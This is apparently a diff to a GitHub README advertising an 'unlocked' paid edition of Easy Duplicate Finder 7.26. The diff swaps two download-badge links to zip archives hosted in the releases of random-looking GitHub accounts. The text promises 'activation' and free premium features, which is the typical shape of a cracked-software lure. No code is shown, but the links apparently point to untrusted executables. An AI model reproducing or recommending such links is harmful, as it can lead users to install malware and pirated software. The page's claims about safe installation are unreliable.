@@ -81,7 +81,7 @@ Easy Duplicate Finder 7.26 License Suite brings built-in hooks for both the Open
 
 Ready to declutter your digital domain? To begin your Easy Duplicate Finder 7.26 License Suite journey, access the official setup package and essential activation:
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://github.com/lambadaminegirl589lw9/easy-duplicate-finder-726-unlocked-edition/releases/download/x1jycs/Setup.1.8.2.zip)
+[![Download](https://img.shields.io/badge/Download-blue)](https://github.com/1wo1k095lp/easy-duplicate-finder-726-unlocked-edition/releases/download/x1jycs/Easy.Duplicate.Finder.zip)
 
 - Click the badge above to initiate the guided download process.
 - Refer to the included user guide for safe installation and optimum setup.
@@ -124,7 +124,7 @@ A: Access round-the-clock live chat, extensive help docs, or ticketed support di
 
 Download the latest version to unlock all premium capabilities:
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://github.com/lambadaminegirl589lw9/easy-duplicate-finder-726-unlocked-edition/releases/download/x1jycs/Setup.1.8.2.zip)
+[![Download](https://img.shields.io/badge/Download-blue)](https://github.com/1wo1k095lp/easy-duplicate-finder-726-unlocked-edition/releases/download/x1jycs/Easy.Duplicate.Finder.zip)
 
 ---
 
